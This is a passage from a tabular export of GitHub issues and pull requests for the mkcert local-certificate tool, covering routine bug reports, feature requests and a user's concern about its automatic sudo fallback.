This is very helpful to write instructions (and/or scripts) that will not be anchored to some old version when a user reads it. However, mkcert puts the version number in the release files, so it is not really possible to use the automatic ""latest"" URL, because the `${FILENAME}` is a different one each time.

My proposal is to move to a naming scheme without version numbers:

* `mkcert-darwin-amd64`
* `mkcert-linux-amd64`
* `mkcert-linux-arm`
* `mkcert-windows-amd64.exe`

This would allow users to grab mkcert from this URL, and be confident that the latest version will always be downloaded, e.g. for Linux:

https://github.com/FiloSottile/mkcert/releases/latest/download/mkcert-linux-amd64

Scripts can already verify the version with two methods: both the redirected download URL, and also with the more standard and ubiquitous `--version` flag, which `mkcert` also has.",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/267/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/267/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/267/events,https://github.com/FiloSottile/mkcert/issues/267,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/266,633127459,MDU6SXNzdWU2MzMxMjc0NTk=,266,"Please clarify what does ""Firefox support is not available on your platform"" mean",6831144,closed,FALSE,NA,NA,2,2020-06-07T07:00:24Z,2020-12-29T16:21:36Z,2020-06-07T08:07:57Z,NONE,NA,"Hello, I see the mention of the Firefox root store only being supported on macOS and Linux, not on Windows. I _think_ the above warning printed during `mkcert -install` refers only to the certificate root being placed to the Firefox root store, not mkcert on Windows not being able to generate Firefox compatible certificates, correct?

And if so, would https://gist.github.com/cecilemuller/9492b848eb8fe46d462abeb26656c4f8#windows-10-firefox be an alternative manual approach to installing the certificate root to the Firefox root store since the automated approach is not supported on Windows?

If that's the case, would you accept a PR which changes the warning text to instead list steps for the manual installation? In my opinion, a tool such as this, likely to be used by novice (as far as web certificates go) users such as myself could do a lot of good by hand-holding the users through the bits it cannot do for them automatically.",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/266/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/266/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/266/events,https://github.com/FiloSottile/mkcert/issues/266,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/265,621924541,MDExOlB1bGxSZXF1ZXN0NDIwODg0ODY1,265,Make mkcert -help print to stdout instead of stderr,1032692,closed,FALSE,NA,NA,1,2020-05-20T16:54:01Z,2020-10-25T23:55:14Z,2020-10-25T23:55:10Z,CONTRIBUTOR,NA,"Currently ""mkcert -help"" prints to stderr, which is rather annoying as:

	$ mkcert -help | less

Gives us a blank page, as it pipes only stdout. To get any results in
less I need to use:

	$ mkcert 2>&1 | less
	$ mkcert |& less     # Non-standard bash/ zsh

Since the user explicitly asked for help with -help, it doesn't make
much sense to output it to stderr IMHO.",NA,TRUE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/265/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/265/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/265/events,https://github.com/FiloSottile/mkcert/pull/265,https://api.github.com/repos/FiloSottile/mkcert/pulls/265
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/264,621920551,MDExOlB1bGxSZXF1ZXN0NDIwODgxNDg4,264,Don't overwrite the -key-file if it's identical to -cert-file,1032692,closed,FALSE,NA,NA,3,2020-05-20T16:48:50Z,2020-10-27T11:34:18Z,2020-10-27T11:34:18Z,CONTRIBUTOR,NA,"Especially for testing I find it much more convenient to just store both
the key and certificate in a single file, which works with pretty much
all software I've used.

Currently, the -cert-file will overwrite the -key-file since it uses
ioutil.WriteFile(). This fixes it to *append* if the files are
identical.",NA,TRUE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/264/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/264/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/264/events,https://github.com/FiloSottile/mkcert/pull/264,https://api.github.com/repos/FiloSottile/mkcert/pulls/264
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/260,610943927,MDU6SXNzdWU2MTA5NDM5Mjc=,260,Specify CA Name on mkcert -install,29711127,open,FALSE,NA,NA,3,2020-05-01T20:09:25Z,2021-02-26T03:14:42Z,NA,NONE,NA,"Would like to request the ability to specify a name for the CA certificate's subject common name when running `mkcert -install`.

Example: `mkcert -instal -name 'My Dev CA 01'`

The built-in method for generating the CN of the CA certificate uses parenthesis in the name which have to be escaped properly in certain languages, bash as an example.",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/260/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/260/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/260/events,https://github.com/FiloSottile/mkcert/issues/260,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/259,602785445,MDU6SXNzdWU2MDI3ODU0NDU=,259,Support for CAroot for Windows Firefox,42245908,closed,FALSE,NA,NA,1,2020-04-19T18:18:42Z,2020-04-19T18:22:41Z,2020-04-19T18:22:40Z,NONE,NA,Hello - is there a way to get this working with Windows Firefox? It is working with Chrome as expected. TY!,NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/259/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/259/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/259/events,https://github.com/FiloSottile/mkcert/issues/259,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/258,601892058,MDExOlB1bGxSZXF1ZXN0NDA1MDY4NzE2,258,set subject CN for client certificates,351469,closed,FALSE,NA,NA,4,2020-04-17T11:05:11Z,2020-10-26T11:42:25Z,2020-10-26T11:42:25Z,NONE,NA,"Many TLS servers and configurations perform client authentication
using the subject CN in the client certificate. This change
adds a subject CN to client certificates.

Fixes #257.",NA,TRUE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/258/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/258/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/258/events,https://github.com/FiloSottile/mkcert/pull/258,https://api.github.com/repos/FiloSottile/mkcert/pulls/258
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/257,601888890,MDU6SXNzdWU2MDE4ODg4OTA=,257,Request: add subject CN for client certificates,351469,closed,FALSE,NA,NA,4,2020-04-17T10:59:17Z,2020-10-30T08:46:05Z,2020-10-25T19:39:13Z,NONE,NA,"For server authentication, SAN DNS is what is required. However, many TLS servers that perform client authentication (mutual TLS) use the subject CN in the client certificate as the identity. An example is Mosquitto (see https://mosquitto.org/man/mosquitto-conf-5.html and `use_identity_as_username`).

I read the discussion in #205. However, I would argue that the situation is different for client certificates. There are common servers and configurations that do not work without the CN in client certificates. Also, TLS clients do not necessarily correspond to DNS names in the way TLS servers do, but may be apps or people (for a person the email address is already supported).",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/257/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/257/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/257/events,https://github.com/FiloSottile/mkcert/issues/257,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/256,601783388,MDU6SXNzdWU2MDE3ODMzODg=,256,ERR_CERT_AUTHORITY,22145610,closed,FALSE,NA,NA,1,2020-04-17T08:04:40Z,2020-10-25T19:43:58Z,2020-10-25T19:43:49Z,NONE,NA,"I use nodejs on windows, when accessed from the desktop there are no problems.
![image](https://user-images.githubusercontent.com/22145610/79546807-38e61b00-80bd-11ea-8071-d105c0362ef5.png)


But when accessed from android. ""Your Connection is not Private"" ERR_CERT_AUTHORITY_INVALID
![image](https://user-images.githubusercontent.com/22145610/79547001-84002e00-80bd-11ea-95ed-156301153e77.png)

Then I try to check at https://www.ssllabs.com/ssltest

the results are as follows:
![image](https://user-images.githubusercontent.com/22145610/79546359-80b87280-80bc-11ea-84d6-2e1809152823.png)
![image](https://user-images.githubusercontent.com/22145610/79546439-a5ace580-80bc-11ea-8dbc-010776dd4272.png)
",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/256/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/256/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/256/events,https://github.com/FiloSottile/mkcert/issues/256,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/255,601670812,MDU6SXNzdWU2MDE2NzA4MTI=,255,Your connection to this site is not fully secure,4601453,closed,FALSE,NA,NA,4,2020-04-17T03:13:08Z,2020-10-25T19:45:33Z,2020-10-25T19:45:33Z,NONE,NA,"![image](https://user-images.githubusercontent.com/4601453/79528339-4ccd5500-809c-11ea-964f-adf3233fe8e2.png)
",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/255/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/255/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/255/events,https://github.com/FiloSottile/mkcert/issues/255,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/254,596928895,MDU6SXNzdWU1OTY5Mjg4OTU=,254,Does this program generate client certificates or just server certificates?,5242583,closed,FALSE,NA,NA,1,2020-04-08T23:48:49Z,2020-04-09T03:03:44Z,2020-04-09T03:03:43Z,NONE,NA,"Does this program generate client certificates or just server certificates?

Sorry more of a question and not a bug report.",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/254/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/254/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/254/events,https://github.com/FiloSottile/mkcert/issues/254,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/253,591667785,MDU6SXNzdWU1OTE2Njc3ODU=,253,net::ERR_SSL_KEY_USAGE_INCOMPATIBLE,43568511,closed,FALSE,NA,NA,3,2020-04-01T06:42:19Z,2020-10-25T19:51:12Z,2020-10-25T19:51:04Z,NONE,NA,"When trying to make a Post request to localhost using chrome with axios in React, (Windows) I receive the above error.

When trying to make the same Post with postman, it works fine",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/253/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/253/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/253/events,https://github.com/FiloSottile/mkcert/issues/253,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/252,591207134,MDU6SXNzdWU1OTEyMDcxMzQ=,252,Trusting in Firefox and macOS keychain at the same time fails if Firefox is not installed,1595007,closed,FALSE,NA,NA,3,2020-03-31T15:33:28Z,2020-10-25T20:01:32Z,2020-10-25T20:01:32Z,NONE,NA,"@mholt, the developer of Caddy Server sent me here.

Caddy tries to make a root CA trusted in all applicable trust stores. On my Mac with macOS Catalina 10.15.4, those are Firefox (NSS) and the macOS keychain.

However in this case, I didn't have Firefox installed, so trusting the CA failed with `ERROR pki failed to install root certificate {""error"": ""not NSS security databases found"", ""certificate_file"": ""storage:pki/authorities/local/root.crt""}`.

The effect is: The CA is not trusted, neither in Firefox (which is to be expected), but also not in the macOS keychain. It seems like `mkcert` fails hard once one of the targeted trust stores is unavailable or once there is an error. Instead it should still try the remaining trust stores.

You can find further details (full logs, more information) in the Caddy issue https://github.com/caddyserver/caddy/issues/3205 as well as in my Caddy forum topic at https://caddy.community/t/v2-local-root-cert-is-not-automatically-trusted-by-macos/7368?u=lukas.

If you need further information, please let me know.",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/252/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/252/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/252/events,https://github.com/FiloSottile/mkcert/issues/252,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/251,588760685,MDU6SXNzdWU1ODg3NjA2ODU=,251,Where the .keystore is located? ,1462548,closed,FALSE,NA,NA,1,2020-03-26T22:13:16Z,2020-10-25T20:03:29Z,2020-10-25T20:03:24Z,NONE,NA,"Or is even possible to generate this type of certificate? I using jboss and i need the .keystore file, mkcert generate them too?

Example of my config:

 ```xml
   <Connector port=""8443"" protocol=""HTTP/1.1"" SSLEnabled=""true"" maxThreads=""200"" scheme=""https"" secure=""true"" clientAuth=""false"" sslProtocols=""TLSv1,TLSv1.1,TLSv1.2"" 
              keystoreFile=""/root/.keystore"" keystorePass=""password <!-- code ommited -->
```",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/251/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/251/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/251/events,https://github.com/FiloSottile/mkcert/issues/251,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/250,586594984,MDU6SXNzdWU1ODY1OTQ5ODQ=,250,mkcert.exe Insufficient system resources - file gets deleted,59985273,open,FALSE,NA,NA,7,2020-03-24T00:01:07Z,2020-10-25T20:05:14Z,NA,NONE,NA,"I'm running in to a very strange issue, whereby suddenly mkcert.exe refuses to run on a developer's PC, where previously it worked fine. I have attached an image of the error and have tried all manner of troubleshooting that I know (created new admin account, running powershell as admin, reinstalled chocolatey, reinstalled mkcert, closed down any programs in the background, rebooted, updated Windows). Literally nothing has helped, and the most bizarre thing is that when we try and run it, and it throws the exception about insufficient system resources, I can watch the file get deleted with my own eyes and appear in the recycle bin.

Any help appreciated.
 
![image](https://user-images.githubusercontent.com/59985273/77374282-62fa3500-6dbe-11ea-8400-5b8293949a96.png)
",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/250/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/250/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/250/events,https://github.com/FiloSottile/mkcert/issues/250,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/249,586255477,MDU6SXNzdWU1ODYyNTU0Nzc=,249,Add CA root to Insomnia,7262437,open,FALSE,NA,NA,5,2020-03-23T14:33:24Z,2021-03-12T08:53:04Z,NA,NONE,NA,"Hello,

After running a `mkcert -install` and generating certificates with it, It works fine on Chrome & Firefox.

But, when I'm trying to send a request with [insomnia](https://insomnia.rest/), It tells me that the certificate can not be trusted.

Is there any way to specify to mkcert other ""db"" where the rootCA must be installed with `certutil` ?

Thanks for this great package !",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/249/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/249/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/249/events,https://github.com/FiloSottile/mkcert/issues/249,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/248,585713286,MDU6SXNzdWU1ODU3MTMyODY=,248,Failed to build in docker after  commit 0603a13b,13185593,closed,FALSE,NA,NA,3,2020-03-22T13:02:02Z,2020-03-23T05:07:29Z,2020-03-22T15:28:45Z,NONE,NA,"Building mkcert
Step 1/14 : FROM alpine:edge
 ---> 24cae4d038c0
Step 2/14 : RUN apk add --no-cache 		ca-certificates
 ---> Using cache
 ---> 68ea5cade319
Step 3/14 : RUN apk -v --update add 	  bash 	  git     curl     make     gcc     musl-dev     openssl     go     python     py-pip     feh     rm -f /var/cache/apk/*
 ---> Using cache
 ---> 451d3aa194b3
Step 4/14 : RUN [ ! -e /etc/nsswitch.conf ] && echo 'hosts: files dns' > /etc/nsswitch.conf
 ---> Using cache
 ---> 9e814938bb20
Step 5/14 : ENV GOLANG_VERSION 1.10.3
 ---> Using cache
 ---> bef43f5de822
Step 6/14 : RUN set -eux;
 ---> Using cache
 ---> 919fb38a9667
Step 7/14 : RUN export	GOROOT_BOOTSTRAP=""$(go env GOROOT)"" 		GOOS=""$(go env GOOS)"" 		GOARCH=""$(go env GOARCH)"" 		GOHOSTOS=""$(go env GOHOSTOS)"" 		GOHOSTARCH=""$(go env GOHOSTARCH)"" 	; 	apkArch=""$(apk --print-arch)""; 	case ""$apkArch"" in 		armhf) export GOARM='6' ;; 		x86) export GO386='387' ;; 	esac; 		wget -O go.tgz ""https://golang.org/dl/go$GOLANG_VERSION.src.tar.gz""; 	echo '567b1cc66c9704d1c019c50bef946272e911ec6baf244310f87f4e678be155f2 *go.tgz' | sha256sum -c -; 	tar -C /usr/local -xzf go.tgz; 	rm go.tgz; 		cd /usr/local/go/src; 	for p in /go-alpine-patches/*.patch; do 		[ -f ""$p"" ] || continue; 		patch -p2 -i ""$p""; 	done; 	./make.bash; 		rm -rf /go-alpine-patches; 	apk del .build-deps; 		export PATH=""/usr/local/go/bin:$PATH""; 	go version
 ---> Using cache
 ---> 046f1ac2dfe5
Step 8/14 : ENV GOPATH /go
 ---> Using cache
 ---> ec5057f1e1be
Step 9/14 : ENV PATH $GOPATH/bin:/usr/local/go/bin:$PATH
 ---> Using cache
 ---> d2ee7c63eb7a
Step 10/14 : RUN mkdir -p ""$GOPATH/src"" ""$GOPATH/bin"" && chmod -R 777 ""$GOPATH""
 ---> Using cache
 ---> 5d0d30e0af7e
Step 11/14 : RUN cd /go &&     go get -u github.com/FiloSottile/mkcert &&     cd src/github.com/FiloSottile/mkcert &&     go build -o /bin/mkcert
 ---> Running in 090dd4f3c3c6
github.com/FiloSottile/mkcert
**src/github.com/FiloSottile/mkcert/main.go:118:23: undefined: debug.ReadBuildInfo
ERROR: Service 'mkcert' failed to build: The command '/bin/sh -c cd /go &&     go get -u github.com/FiloSottile/mkcert &&     cd src/github.com/FiloSottile/mkcert &&     go build -o /bin/mkcert' returned a non-zero code: 2**",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/248/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/248/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/248/events,https://github.com/FiloSottile/mkcert/issues/248,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/246,582974849,MDU6SXNzdWU1ODI5NzQ4NDk=,246,libnssutil3 was not loaded for installing,5033716,closed,FALSE,NA,NA,2,2020-03-17T12:23:44Z,2020-03-21T03:19:01Z,2020-03-21T03:19:00Z,NONE,NA,"I've tried to execute `$ mkcert -install`

```
Using the local CA at ""/Users/someuser/Library/Application Support/mkcert"" ✨
The local CA is already installed in the system trust store! 👍
ERROR: failed to execute ""certutil -A -d sql:/Users/someuser/Library/Application Support/Firefox/Profiles/2ekfser2.default-release"": signal: abort trap

dyld: Library not loaded: /usr/local/Cellar/nss/3.36.1/lib/libnssutil3.dylib
  Referenced from: /usr/local/bin/certutil
  Reason: image not found
```
After that I've tried to execute `$ mkcert 0.0.0.0`

```
Using the local CA at ""/Users/dakiesse/Library/Application Support/mkcert"" ✨
Warning: the local CA is not installed in the Firefox trust store! ⚠️
Run ""mkcert -install"" to avoid verification errors ‼️

Created a new certificate valid for the following names 📜
 - ""0.0.0.0""

The certificate is at ""./0.0.0.0.pem"" and the key at ""./0.0.0.0-key.pem"" ✅
```

MacOS: 10.15.2
I've tried to use `$ brew upgrade` but it didn't help me",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/246/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/246/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/246/events,https://github.com/FiloSottile/mkcert/issues/246,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/245,582681781,MDU6SXNzdWU1ODI2ODE3ODE=,245,How to change publisher  info,5285071,open,FALSE,NA,NA,0,2020-03-17T00:53:39Z,2020-03-19T00:58:56Z,NA,NONE,NA,"The default mkcert commad's  cert info is:   
Subject:  /O=mkcert development certificate/OU=root@myosname
Issuer:   mkcert root@myosname
How can i to chage the root@myosname info to www.myhost.com?
",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/245/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/245/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/245/events,https://github.com/FiloSottile/mkcert/issues/245,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/243,581059079,MDU6SXNzdWU1ODEwNTkwNzk=,243,Cert Authority Invalid -- Chrome & Firefox,28659460,closed,FALSE,NA,NA,0,2020-03-14T06:04:18Z,2020-03-14T07:57:02Z,2020-03-14T07:56:43Z,NONE,NA,"Currently running nginx on WSL -- Ubuntu 18.04.

- Installed binary on linux, configured nginx to listen on port 80 and 443.
- Generated a key and certificate according to the docs
-- NET::ERR_CERT_AUTHORITY_INVALID error on Chrome and Error code: SEC_ERROR_UNKNOWN_ISSUER on Firefox

- Installed mkcert executable on Windows, created a key on windows system, copied that over to CAROOT directory in linux and generated new certificates. Errors again.

- Tried exporting the certificate received in the browser and importing them manually as trusted providers. As a last ditch effort tried using doing the same with the .pem file, still no luck.

example.com (redirected via hosts file) and localhost both default to http and errors occur when trying to access https://example.com and https://localhost

----------------------
Ok working now. Somewhere between creating a new key again to test out a different URL, reimporting the certificates into the browser, ending the chrome process and flushing the dnscache in ipconfig it started to work. Maybe something to do with these last two steps to get it to stick but not sure.",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/243/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/243/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/243/events,https://github.com/FiloSottile/mkcert/issues/243,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/241,569095660,MDU6SXNzdWU1NjkwOTU2NjA=,241,Safari will start limiting validity to 1 year,112444,closed,FALSE,NA,NA,1,2020-02-21T17:47:55Z,2020-10-25T20:13:21Z,2020-10-25T20:13:21Z,NONE,NA,"Per https://www.thesslstore.com/blog/ssl-certificate-validity-will-be-limited-to-one-year-by-apples-safari-browser/ Safari will start limiting cert validity to a year. 

I'd be in favor of switching mkcert certs to just have a 364-day validity. At least the way we use them, they get regenerated much sooner than a year.",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/241/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/241/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/241/events,https://github.com/FiloSottile/mkcert/issues/241,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/240,568985851,MDExOlB1bGxSZXF1ZXN0Mzc4MzA3ODM0,240,Custom CA name and hosts as Subjects,2525006,open,FALSE,NA,NA,0,2020-02-21T14:23:53Z,2020-02-21T14:23:58Z,NA,NONE,NA,"This is a simple PR for the ability to give your CA a custom name, and rather than use the default `user@hostname` in the `Subjects` allow it to be populated by `hosts`.

Since this is cosmetic only, I won't be offended at all of you don't choose to merge :)",NA,TRUE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/240/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/240/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/240/events,https://github.com/FiloSottile/mkcert/pull/240,https://api.github.com/repos/FiloSottile/mkcert/pulls/240
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/239,568812492,MDU6SXNzdWU1Njg4MTI0OTI=,239,Support firefox on Windows,30685349,open,FALSE,NA,NA,7,2020-02-21T08:36:36Z,2021-03-13T08:54:24Z,NA,NONE,NA,"Hello, i would like to ask about support for FF @ Windows 10
Is any chance / plans for this?
Or maybe do you know any ""hack"" for it ?",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/239/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/239/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/239/events,https://github.com/FiloSottile/mkcert/issues/239,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/238,562828429,MDU6SXNzdWU1NjI4Mjg0Mjk=,238,Chrome error ERR_CERT_VALIDITY_TOO_LONG,2576444,closed,FALSE,NA,NA,11,2020-02-10T21:08:32Z,2021-01-12T23:40:09Z,2020-10-25T23:05:53Z,NONE,NA,"Looks like Google Chrome added a new validation for certificates where it checks that the expiration date is not too far into the future. 

By default mkcert created a 10 years long certificate and Chrome does not like that. Can we reduce that or add a flag to customize it with a lower number?

Attached example of error page:

![Screen Shot 2020-02-10 at 4 06 29 PM](https://user-images.githubusercontent.com/2576444/74189999-835f9d00-4c1f-11ea-9d38-42337b5b1443.png)

",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/238/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/238/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/238/events,https://github.com/FiloSottile/mkcert/issues/238,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/237,559706926,MDU6SXNzdWU1NTk3MDY5MjY=,237,Your connection is not private,43741589,closed,FALSE,NA,NA,2,2020-02-04T13:05:22Z,2020-10-25T23:07:22Z,2020-10-25T23:07:18Z,NONE,NA,Not working : NET::ERR_CERT_COMMON_NAME_INVALID,NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/237/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/237/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/237/events,https://github.com/FiloSottile/mkcert/issues/237,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/236,550612159,MDU6SXNzdWU1NTA2MTIxNTk=,236,Automatic sudo fallback is scary!,799737,open,FALSE,NA,NA,0,2020-01-16T06:56:53Z,2020-01-16T06:56:53Z,NA,NONE,NA,"If the user wants to give mkcert the ability to run as root via sudo then they should explicitly do so.

Having a process fallback to running via sudo automatically itself is very scary.  It basically allows mkcert to piggy back root privileges of the back of another unrelated command's sudo timeout window.

This is pretty ripe for abuse.  It is also very surprising when you run mkcert without sudo and discover that has somehow magically managed to write to your system trust store.  This is exactly what happened to me, and led to me trying to figure out how this happened.

Printing a message saying ""That operation requires root - rerun with sudo"" should be all that is needed.",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/236/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/236/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/236/events,https://github.com/FiloSottile/mkcert/issues/236,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/235,548138839,MDExOlB1bGxSZXF1ZXN0MzYxNDk5MDUy,235,"cert: if OU_EXTRA_INFO is set, add it to OU",154439,open,FALSE,NA,NA,0,2020-01-10T15:23:33Z,2020-01-10T15:23:33Z,NA,NONE,NA,"Potential change for #229 - first change (and first Go code), so I'm sure there are things that could be improved. :-)

CC @dsebastien",NA,TRUE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/235/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/235/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/235/events,https://github.com/FiloSottile/mkcert/pull/235,https://api.github.com/repos/FiloSottile/mkcert/pulls/235
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/234,547857119,MDU6SXNzdWU1NDc4NTcxMTk=,234,Create cert for host with port doesn't allow,11817656,closed,FALSE,NA,NA,2,2020-01-10T04:22:14Z,2020-05-03T23:48:49Z,2020-05-03T23:48:49Z,NONE,NA,"I want to create a certification for a host with a specific port:

```bash
mkcert ""localhost:4447""
```

On execute this following command, we get this following result:
```
Using the local CA at ""/Users/truongnmt/Library/Application Support/mkcert"" ✨
ERROR: ""localhost:4447"" is not a valid hostname, IP, URL or email
```",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/234/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/234/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/234/events,https://github.com/FiloSottile/mkcert/issues/234,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/233,547832220,MDU6SXNzdWU1NDc4MzIyMjA=,233,Installed certificate does not show up in Certificate Trust Settings,1441652,closed,FALSE,NA,NA,3,2020-01-10T02:41:00Z,2020-10-25T23:46:04Z,2020-10-25T23:46:04Z,NONE,NA,"Related to #47 

I recently installed the latest mkcert and am unable to see the cert in ""Certificate Trust Settings"". I tried uninstalling, deleting the root, and regenerating, for good measure, but no dice.

![IMG_4EF636D49D4C-1](https://user-images.githubusercontent.com/1441652/72121279-704f6980-330f-11ea-99b6-34e150c53c6d.jpeg)
",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/233/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/233/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/233/events,https://github.com/FiloSottile/mkcert/issues/233,NA
